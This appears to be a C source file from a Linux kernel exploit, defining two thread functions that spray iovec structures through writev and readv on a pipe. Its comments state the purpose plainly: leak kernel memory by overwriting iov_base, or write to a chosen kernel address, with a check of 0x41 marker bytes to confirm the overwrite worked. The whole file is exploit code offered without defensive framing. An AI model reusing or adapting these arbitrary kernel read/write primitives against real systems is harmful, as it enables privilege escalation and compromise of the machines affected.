#include "conf.h"
#include "types.h"


void *t_spray_iovec_to_read(void *_args) {
    iovec_thread_args *args = (iovec_thread_args *)_args;

    // 1. read data from kernel space
    //    use writev ; overwrite iov_base to leak data.
    //    if iov_base is not overwritten, the first 8 byte of buf should be AAAAAAAA.
    if (writev(args->fd[1], args->stack, IOVEC_SIZE) == -1) {
        perror("writev");
    }

    pthread_exit(NULL);
}

void *t_spray_iovec_to_write(void *_args) {
    iovec_thread_args *args = (iovec_thread_args *)_args;

    // 1. write data in kernel space
    //    use readv ; overwrite iov_base to set target address
    //    if iov_base is not overwritten, first 8 bytes of buf should be AAAAAAAA.
    if (readv(args->fd[0], args->stack, IOVEC_SIZE) == -1) {
        perror("readv");
    }

    // 2. check if the first 8 bytes of buf is AAAAAAAA.
    //    overwrite is successful if the value is still AAAAAAAA.
    args->success = PTR_DEREF(args->buf, 64) == 0x4141414141414141;

    pthread_exit(NULL);
}